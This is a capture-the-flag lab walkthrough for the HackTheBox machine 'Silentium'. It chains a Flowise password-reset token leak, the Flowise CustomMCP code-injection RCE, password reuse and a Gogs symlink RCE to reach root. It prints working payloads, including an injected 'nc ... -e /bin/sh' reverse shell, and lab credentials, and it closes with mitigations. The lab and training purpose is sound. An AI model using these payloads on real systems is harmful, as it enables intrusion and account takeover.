<p align="center">
  <img src="https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge&logo=hackthebox" alt="HackTheBox" />
  <img src="https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge&logo=linux" alt="OS Linux" />
  <img src="https://img.shields.io/badge/Difficulty-Easy-yellow?style=for-the-badge" alt="Easy Difficulty" />
</p>

# Silentium Notes

## Step 1 - Reconnaissance

```bash
nmap -A -sS -P -T4  --min-rate 5000 10.129.20.232
```

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-13 14:13 UTC
Nmap scan report for 10.129.20.232
Host is up (0.25s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://silentium.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=4/13%OT=22%CT=1%CU=42534%PV=Y%DS=2%DC=T%G=Y%TM=69DC
OS:FA21%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=108%TI=Z%CI=Z%TS=A)SEQ(S
OS:P=106%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=106%GCD=1%ISR=108%TI=Z%CI
OS:=Z%II=I%TS=A)SEQ(SP=106%GCD=1%ISR=109%TI=Z%CI=Z%TS=A)SEQ(SP=107%GCD=1%IS
OS:R=109%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11
OS:NW7%O4=M552ST11NW7%O5=M552ST11NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE8
OS:8%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)
OS:T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=
OS:0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T
OS:6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+
OS:%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK
OS:=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   253.72 ms 10.10.14.1
2   248.14 ms 10.129.20.232

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.77 seconds
```

> — Linux machine!

> — Lets scan for subdomains!

```bash
gobuster vhost -u http://silentium.htb \
  -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain \
  -t 50
```

```text
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://silentium.htb
[+] Method:          GET
[+] Threads:         50
[+] Wordlist:        /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: staging.silentium.htb Status: 200 [Size: 3142]
Progress: 4989 / 4990 (99.98%)
===============================================================
Finished
===============================================================
```

> — when i reached this subdomains, it seems some sort of Flowise(build ai agents) login page.

> — While looking at the subdirectories, there is a login and a registration page, and registration page is kind of broken

> — Found the Version though!

```bash
curl -s http://staging.silentium.htb/api/v1/version
```

```json
{"version":"3.0.5"}
```

> — A Critical Severity vulnerability is found to be associated with this version of flowise ai building platform!

* **CVE-2025-59528**
  * **Description / Cause of the Vulnerability:**
    The CustomMCP node allows users to input configuration settings for connecting to an external MCP (Model Context Protocol) server. This node parses the user-provided `mcpServerConfig` string to build the MCP server configuration. However, during this process, it executes JavaScript code without any security validation.
    Specifically, inside the `convertToValidJSONString` function, user input is directly passed to the `Function()` constructor, which evaluates and executes the input as JavaScript code. Since this runs with full Node.js runtime privileges, it can access dangerous modules such as `child_process` and `fs`.
  * **Vulnerability Flow:**
    1. **User Input Received:** Input is provided via the API endpoint `/api/v1/node-load-method/customMCP` through the `mcpServerConfig` parameter.
    2. **Variable Substitution:** The `substituteVariablesInString` function replaces template variables like `$vars.xxx`, but no security filtering is applied during this step.
    3. **Dangerous Code Execution:** The `convertToValidJSONString` function executes the input using `Function('return ' + inputString)()`. If the `inputString` contains malicious code, it gets executed in the global Node.js context, allowing actions such as command execution and file system access.

> — I looked for this vulnerability, and then i got to know, that we need to authenticate first, in order to do RCE.

> — There is another authentication bypass flow in this version, in the reset password field!

* The `forgot-password` endpoint in Flowise returns sensitive information including a valid password reset `tempToken` without authentication or verification. This enables any attacker to generate a reset token for arbitrary users and directly reset their password, leading to a complete account takeover (ATO).

> — This says we can use an existing and authorized email, to reset the password, with getting the temp token that can be passed in the temp token field which will eventually lead us to reset password

> — Now before that, we need to find out the real email address.

> — go to the main website of silentium and there on the Institutional leadership portion, we can see there are 2 names:
> 1. Marcus Throne
> 2. Ben
> 3. Elena Rossi

> — and of course the email domain would silentium.htb

> — Lets try with each user!

```bash
curl -i -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"marcus@silentium.htb"}}'
```

```http
HTTP/1.1 404 Not Found
Server: nginx/1.24.0 (Ubuntu)
Date: Thu, 16 Apr 2026 14:53:46 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 72
Connection: keep-alive
Vary: Origin
Access-Control-Allow-Credentials: true
ETag: W/"48-gH7pL1CkrO5wpzWe8tiSqCqsAlA"

{"statusCode":404,"success":false,"message":"User Not Found","stack":{}}
```

```bash
curl -i -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"elena@silentium.htb"}}'
```

```http
HTTP/1.1 404 Not Found
Server: nginx/1.24.0 (Ubuntu)
Date: Thu, 16 Apr 2026 14:53:55 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 72
Connection: keep-alive
Vary: Origin
Access-Control-Allow-Credentials: true
ETag: W/"48-gH7pL1CkrO5wpzWe8tiSqCqsAlA"

{"statusCode":404,"success":false,"message":"User Not Found","stack":{}}
```

```bash
curl -i -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"ben@silentium.htb"}}'
```

```http
HTTP/1.1 201 Created
Server: nginx/1.24.0 (Ubuntu)
Date: Thu, 16 Apr 2026 14:54:02 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 579
Connection: keep-alive
Vary: Origin
Access-Control-Allow-Credentials: true
ETag: W/"243-yhsRpTf1RS5s1OovC3d2KP9AkCY"

{"user":{"id":"e26c9d6c-678c-4c10-9e36-01813e8fea73","name":"admin","email":"ben@silentium.htb","credential":"$2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG","tempToken":"TLqOeJRfcrakNlmuZiHuzcVEKvG1XW1l67fkpi07hKRVcIxULoOcOZOezwvRkCFx","tokenExpiry":"2026-04-16T15:09:02.045Z","status":"active","createdDate":"2026-01-29T20:14:57.000Z","updatedDate":"2026-04-16T14:54:02.000Z","createdBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73","updatedBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73"},"organization":{},"organizationUser":{},"workspace":{},"workspaceUser":{},"role":{}}
```

> — Got token for ben 10 :)

> — Go to the reset-password endpoint, paste this token, and then change the password, and then just log in!

## Step 2 - Initial Foothold

> — Now that we're logged in, we can exploit the know RCE vulnerability in MCP configuration!

```bash
curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc" \
  -d '{
    "loadMethod": "listActions",
    "inputs": {
      "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"nc 10.10.14.253 4444 -e /bin/sh\");return 1;})()})"
    }
  }'
```

> — On the listener!

```bash
nc -lvnp 4444
```

```text
listening on [any] 4444 ...
connect to [10.10.14.253] from (UNKNOWN) [10.129.37.52] 33587
# whoami
root
```

> — we got a docker container!

> — Surely this is a docker container, so we won't have much things to do here!

> — Lets look for the Environment Variables

```bash
env
```

```text
FLOWISE_PASSWORD=F1l3_d0ck3r
ALLOW_UNAUTHORIZED_CERTS=true
NODE_VERSION=20.19.4
HOSTNAME=c78c3cceb7ba
YARN_VERSION=1.22.22
SMTP_PORT=1025
SHLVL=3
PORT=3000
HOME=/root
SENDER_EMAIL=ben@silentium.htb
PUPPETEER_EXECUTABLE_PATH=/usr/bin/chromium-browser
JWT_ISSUER=ISSUER
JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
LLM_PROVIDER=nvidia-nim
SMTP_USERNAME=test
SMTP_SECURE=false
JWT_REFRESH_TOKEN_EXPIRY_IN_MINUTES=43200
FLOWISE_USERNAME=ben
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
DATABASE_PATH=/root/.flowise
JWT_TOKEN_EXPIRY_IN_MINUTES=360
JWT_AUDIENCE=AUDIENCE
SECRETKEY_PATH=/root/.flowise
PWD=/
SMTP_PASSWORD=r04D!!_R4ge
NVIDIA_NIM_LLM_MODE=managed
SMTP_HOST=mailhog
JWT_REFRESH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
SMTP_USER=test
```

> — we got 2 clear text passwords, lets try getting ssh

> — Tried both and the SMTP, works!

```bash
ssh ben@silentium.htb
```

```text
ben@silentium.htb's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-107-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri Apr 17 02:40:44 PM UTC 2026

  System load:           0.04
  Usage of /:            82.8% of 13.37GB
  Memory usage:          18%
  Swap usage:            0%
  Processes:             258
  Users logged in:       0
  IPv4 address for eth0: 10.129.38.122
  IPv6 address for eth0: dead:beef::250:56ff:feb0:d6f3

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Last login: Wed Apr  8 19:12:55 2026 from 10.10.14.5
ben@silentium:~$ 
```

## Step 3 - Privilege Escalation

> — Lets look for sudo permissions 

```bash
sudo -l
```

```text
[sudo] password for ben: 
Sorry, user ben may not run sudo on silentium.
```

> — No sudo permissions!

> — While enumerating i found a gogs executable!

```bash
cd /opt/gogs/gogs
ls -la
```

```text
total 79368
drwxr-xr-x 6 root root     4096 Apr  8 09:41 .
drwxr-xr-x 6 root root     4096 Apr  8 09:41 ..
drwxr-xr-x 3 root root     4096 Apr  8 09:41 custom                                               
drwxr-xr-x 3 root root     4096 Apr  8 09:41 data
-rwxr-xr-x 1 root root 81220896 Jun  9  2025 gogs
-rwxr-xr-x 1 root root     1054 Jun  9  2025 LICENSE                                              
drwxr-xr-x 2 root root     4096 Apr  8 09:41 log
-rwxr-xr-x 1 root root     6626 Jun  9  2025 README.md                                            
-rwxr-xr-x 1 root root     5385 Jun  9  2025 README_ZH.md                                         
drwxr-xr-x 7 root root     4096 Apr  8 09:41 scripts 
```

> — We can execute it. lets execute then

```bash
/opt/gogs/gogs/gogs --help
```

```text
NAME:
   Gogs - A painless self-hosted Git service

USAGE:
   gogs [global options] command [command options] [arguments...]

VERSION:
   0.13.3

COMMANDS:
   web      Start web server
   serv     This command should only be called by SSH shell
   hook     Delegate commands to corresponding Git hooks
   cert     Generate self-signed certificate
   admin    Perform admin operations on command line
   import   Import portable data as local Gogs data
   backup   Backup files and database
   restore  Restore files and database from backup
   help, h  Shows a list of commands or help for one command

GLOBAL OPTIONS:
   --help, -h     show help
   --version, -v  print the version
```

> — Gogs is primarily an open-source, self-hosted Git service written in Go, designed as a lightweight and fast alternative to GitHub or GitLab for managing code repositories. It is used for version control, tracking project changes, and managing tasks, often on private servers or lightweight infrastructure.

> — Now if its a self-hosted git service, then it must be running on the system as service?

> — Lets look at netstats

```bash
netstat -lantp
```

```text
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:37631         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3001          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8025          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:1025          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -
tcp        0      1 10.129.78.103:48594    8.8.8.8:53              SYN_SENT    -
tcp        0   1096 10.129.78.103:22       10.10.13.68:46408       ESTABLISHED -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

> — there is a possibility that it should be from these 2 ports.

> — While digging more, i knew that, the 3000 is running flowise instance and the 3001 is running gogs service

```bash
curl http://127.0.0.1:3001 | head
```

```html
<!DOCTYPE html>
<html>
  <head data-suburl="">
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
         <meta name="author" content="Gogs" />
        <meta name="description" content="Gogs is a painless self-hosted Git service" />
        <meta name="keywords" content="go, git, self-hosted, gogs">
```

> — Confirmed!

> — we got version for gogs  0.13.3, and it also has an RCE vulnerability

* **CVE-2025-8110**
  * **Description:** Gogs failed to recursively validate symbolic links in its file update API. Attackers can push a symlink to a repo, use the API to write through that link into `.git/config`, and achieve RCE via the `core.sshCommand` vector.
  * **Step-by-Step Attack Flow:**
    1. Creates a symlink: `ln -s .git/config link`, commits and pushes it
    2. Sends a PUT request to `/api/v1/repos/{owner}/{repo}/contents/link` with a base64-encoded malicious config
    3. The API's `UpdateRepoFile` skips key security checks, writing to `.git/config`
    4. This triggers RCE on Git operations

> — There is a public POC for this exploitation

```bash
wget https://raw.githubusercontent.com/zAbuQasem/gogs-CVE-2025-8110/main/CVE-2025-8110.py
```

> — Before going any further we need to tunnel up to access the gogs

> — Start Server on attacker machine

```bash
./chisel-lin server --reverse --port 8080
```

```text
2026/04/17 15:31:35 server: Reverse tunnelling enabled
2026/04/17 15:31:35 server: Fingerprint 7gCwJQhAE9oEfFMajc4n5q31Gs76MoZE5c9rYE1jr0g=
2026/04/17 15:31:35 server: Listening on http://0.0.0.0:8080
```

> — On target, start client

```bash
./chisel-lin.1 client 10.10.14.253:8080 R:9000:127.0.0.1:3001
```

> — Note: here i have bind 3001 port with 9000, so you have to use 9000 while accessing the web in your machine!

> — Before running the script, create a user in the web, via registration.

> — once done, remove the register() call from the code, it will likely fail, because the web has captcha to proceed. so just remove it, and add your newly created username and password in the main() body.

> — Now lets run the script!

```bash
python3 CVE-2025-8110.py -u http://127.0.0.1:9000 -lh "10.10.14.****" -lp 6000
```

```text
[+] Authenticated successfully
Token generation status: 200
[+] Application token: 
863677e362a2653555cfe44b94d54a4e7c8a75ba
Repo creation status: 201
Cloning into '/tmp/4f9ffc2db849'...
remote: Enumerating objects: 3, done.
remote: Counting objects: 100% (3/3), done.
remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
Unpacking objects: 100% (3/3), 249 bytes | 249.00 KiB/s, done.
[master f02218c] Add malicious symlink
 1 file changed, 1 insertion(+)
 create mode 120000 malicious_link
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Delta compression using up to 3 threads
Compressing objects: 100% (2/2), done.
Writing objects: 100% (3/3), 295 bytes | 295.00 KiB/s, done.
Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
To http://127.0.0.1:9000/test/4f9ffc2db849.git
   755353d..f02218c  master -> master
[+] Exploit sent, check your listener!
[-] Error: HTTPConnectionPool(host='127.0.0.1', 
port=9000): Read timed out. (read timeout=5)
```

> — ON the listener!

```bash
nc -lvnp 6000
```

```text
listening on [any] 6000 ...
connect to [10.10.14.253] from (UNKNOWN) [10.129.38.127] 58482
bash: cannot set terminal process group (1485): Inappropriate ioctl for device
bash: no job control in this shell
root@silentium:/opt/gogs/gogs/data/tmp/local-repo/2# cd /
root@silentium:/# cd root
root@silentium:~# ls
gogs-repositories
root.txt
```

## Mitigation & Security Perspective

> [!CAUTION]
> **Flowise Password Reset Token Leakage & Account Takeover**
> The `forgot-password` endpoint in Flowise leaks the generated `tempToken` directly in the API response. This allows an attacker to reset any user's password without having access to their email box.
> **Mitigation:** Patches must be applied to Flowise. The endpoint must not return the `tempToken` in the response body. It should only trigger an email delivery with a link containing the token. Ensure password reset mechanisms follow secure-by-design principles, strictly keeping reset tokens confidential.

> [!CAUTION]
> **CVE-2025-59528 - Flowise CustomMCP Node RCE**
> Flowise customMCP endpoint evaluates code input inside a `Function()` constructor. This permits raw Node.js runtime code execution and allows escaping the application to run host commands.
> **Mitigation:** Upgrade Flowise to a secure version. Do not use dynamic execution functions (such as `eval()`, `Function()`, or `vm`) on untrusted strings. If dynamic javascript evaluation is absolutely required, run it inside a highly restricted and isolated sandbox.

> [!CAUTION]
> **CVE-2025-8110 - Gogs Symlink Validation Bypass to RCE**
> Gogs v0.13.3 fails to recursively resolve symbolic links before writing to them in the file update API. This allows writing directly to the `.git/config` file and hijacking `core.sshCommand` to execute system commands as root.
> **Mitigation:** Upgrade Gogs to a secure version (0.13.4+ or patched releases) that enforces strict symbolic link resolution and prevents path traversal to `.git/config`. Restrict the Gogs service so that it runs as a dedicated, low-privileged user (e.g., `git`), rather than `root`.

> [!WARNING]
> **Hardcoded Credentials in Environment Variables**
> Sensitive SMTP credentials (`SMTP_PASSWORD=r04D!!_R4ge`) were stored in plaintext inside the container's environment variables. Since the same password was reused for user `ben`'s host SSH access, compromising the container immediately led to a full host takeover.
> **Mitigation:** Never store secrets in plain-text environment variables or config files. Use a dedicated secrets manager. Avoid password reuse across different environments and service boundaries.
